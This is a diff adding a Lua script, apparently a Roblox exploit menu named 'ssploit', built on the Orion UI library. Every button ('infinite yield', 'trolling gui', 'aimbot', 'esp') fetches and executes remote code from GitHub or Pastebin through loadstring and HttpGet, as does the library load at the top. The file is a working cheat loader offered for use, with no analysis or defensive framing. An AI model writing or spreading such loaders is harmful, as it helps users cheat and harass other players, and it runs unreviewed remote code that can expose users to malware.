@@ -1,0 +1,44 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local Window = OrionLib:MakeWindow({Name = "ssploit", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+-- Tab 1 
+
+local Tab = Window:MakeTab({
+	Name = "exploits",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "exploits"
+})
+
+Tab:AddButton({
+	Name = "infinite yield",
+	Callback = function()
+      		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "trolling gui",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "aimbot",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-V2/main/Resources/Scripts/Aimbot%20V2%20GUI.lua"))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "esp",
+	Callback = function()
+      		loadstring(game:HttpGet("https://pastebin.com/raw/s7viVmDR"))()
+  	end    
+})
+
